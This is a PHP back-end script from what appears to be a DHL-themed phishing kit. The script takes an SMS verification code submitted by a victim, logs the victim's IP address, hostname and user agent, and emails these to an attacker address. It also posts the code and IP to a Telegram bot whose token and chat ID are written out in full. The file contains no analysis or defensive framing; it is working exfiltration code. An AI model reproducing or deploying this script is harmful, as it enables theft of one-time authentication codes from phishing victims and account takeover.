<?php 

$smscode=$_POST['smscode'];

include './email-dialk.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$msg  = "===================DHL=================="."\n";
$msg.="SMS :".$_POST['smscode']."\n";

$msg .= "===================================================="."\n";
$msg .= "date entry  :" . date("Y-m-d - H:i:s - ")."\n";
$msg .= "Client IP   : ".$ip."\n";
$msg .= "HostName    : ".$hostname."\n";
$msg .= "User Agent  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$msg .= "===================Metri copyright=====================\n";
$subject = "DHL " . "SMS:" . $_POST['smscode'] . " ip=> " . $ip;
mail($to,$subject,$msg);


$ipp=$_SERVER['REMOTE_ADDR'];

$txt="";
$txt.="========================================================="."\n";
$txt.="SMS CODE:".$smscode."\n";
$txt.="Ip :".$ipp."\n";





$website="https://api.telegram.org/bot5221884129:AAHKgrYbLSMtqU5nOu4Y1LUveNxtDXbUMbY666999";

$params=[
    'chat_id'=>'-1001665147381',
    'text'=>$txt,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);



echo json_encode($_POST);


 ?>
